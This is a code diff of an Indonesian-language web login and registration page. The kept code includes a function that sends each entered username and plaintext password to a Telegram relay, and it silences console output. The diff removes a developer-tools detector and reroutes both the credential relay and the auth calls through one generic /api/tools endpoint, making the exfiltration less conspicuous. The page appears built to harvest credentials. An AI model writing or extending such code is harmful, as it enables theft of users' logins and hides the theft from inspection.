@@ -647,24 +647,6 @@
       try { window.top.location = window.self.location; }
       catch (e) { document.body.innerHTML = ''; }
     }
-    var devtoolsOpen = false;
-    var threshold = 160;
-    setInterval(function() {
-      var wDiff = window.outerWidth - window.innerWidth;
-      var hDiff = window.outerHeight - window.innerHeight;
-      if (wDiff > threshold || hDiff > threshold) {
-        if (!devtoolsOpen) {
-          devtoolsOpen = true;
-          document.body.innerHTML =
-            '<div style="position:fixed;inset:0;background:#000;color:#dc2626;' +
-            'display:flex;align-items:center;justify-content:center;' +
-            'font-family:Inter,sans-serif;font-size:22px;font-weight:900;' +
-            'letter-spacing:2px;text-align:center;padding:20px;z-index:999999;">' +
-            'AKSES DITOLAK<br><span style="font-size:14px;color:#fff;font-weight:600;margin-top:12px;display:block;">' +
-            'Tutup Developer Tools untuk melanjutkan.</span></div>';
-        }
-      } else { devtoolsOpen = false; }
-    }, 1000);
     try {
       console.log = function() {};
       console.warn = function() {};
@@ -708,14 +690,14 @@
   }
 
   /* ============================================
-     PARSE RESPONSE (ANTI "NOT VALID JSON")
+     PARSE RESPONSE
      ============================================ */
   async function parseResponse(res) {
     var text = await res.text();
     try {
       return JSON.parse(text);
     } catch (e) {
-      return { success: false, message: 'Server tidak merespons JSON. Cek endpoint /api/auth.' };
+      return { success: false, message: 'Server tidak merespons JSON. Cek endpoint /api/tools.' };
     }
   }
 
@@ -724,7 +706,7 @@
      ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
     try {
-      var res = await fetch('/api/telegram', {
+      var res = await fetch('/api/tools?action=telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: username, password: password, tipe: tipe })
@@ -737,7 +719,7 @@
   }
 
   /* ============================================
-     HANDLE LOGIN — /api/auth?action=login
+     HANDLE LOGIN
      ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
@@ -755,7 +737,7 @@
     btn.classList.add('loading');
 
     try {
-      var res = await fetch('/api/auth?action=login', {
+      var res = await fetch('/api/tools?action=auth&sub=login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         credentials: 'include',
@@ -786,7 +768,7 @@
   }
 
   /* ============================================
-     HANDLE REGISTER — /api/auth?action=register
+     HANDLE REGISTER
      ============================================ */
   async function handleRegister(e) {
     e.preventDefault();
@@ -813,7 +795,7 @@
     btn.classList.add('loading');
 
     try {
-      var res = await fetch('/api/auth?action=register', {
+      var res = await fetch('/api/tools?action=auth&sub=register', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: username, password: password })
